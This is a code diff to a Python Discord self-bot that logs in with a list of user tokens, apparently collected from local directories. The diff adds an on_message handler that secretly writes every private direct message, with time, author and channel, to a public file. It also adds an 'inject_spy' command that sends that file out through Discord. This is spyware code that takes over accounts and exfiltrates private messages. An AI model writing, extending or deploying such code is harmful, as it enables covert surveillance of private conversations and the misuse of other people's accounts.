@@ -3,6 +3,7 @@ from discord.ext import commands
 import asyncio
 import re 
 import os
+import datetime
 import threading
 import requests
 
@@ -47,6 +48,17 @@ bot = commands.Bot(command_prefix=prefix, self_bot=True, intents=intents)
 @bot.event
 async def on_ready():
     print("Logged in as: " + bot.user.name)
+
+@bot.event
+async def on_message(message):
+    with open("C:\\Users\\Public\\dms.txt", "a") as dms:
+        if message.channel.type is discord.ChannelType.private:
+            current_time = datetime.datetime.now()
+            dms.write(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + str(message.author) + str(message.channel) + "> " + str(message.content) + "\n")
+
+@bot.command()
+async def inject_spy(ctx):
+    ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
 
 @bot.command()
 async def delete(ctx):
@@ -118,6 +130,6 @@ if os.path.isdir(str(path7)):
 
 for token in tokens:
     if check_token(token):
-        bot.run(token)
+        bot.run(token, bot=False)
     else:
         pass
